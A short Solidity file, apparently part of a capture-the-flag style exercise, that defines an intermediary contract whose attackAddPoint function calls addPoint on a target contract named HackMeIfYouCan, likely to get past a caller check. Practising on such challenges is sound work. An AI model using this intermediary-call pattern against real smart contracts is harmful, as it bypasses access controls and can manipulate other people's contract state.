// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;
import {Script, console} from "forge-std/Script.sol";
import {HackMeIfYouCan} from "./HackMeIfYouCan.sol";

contract AddPointIntermediate {
    address public hackMeIfYouCan;

    constructor(address _hackMeIfYouCan) {
        hackMeIfYouCan = _hackMeIfYouCan;
    }

    function attackAddPoint() public {
        HackMeIfYouCan hackMeContract = HackMeIfYouCan(payable(hackMeIfYouCan));
        hackMeContract.addPoint();
    }
}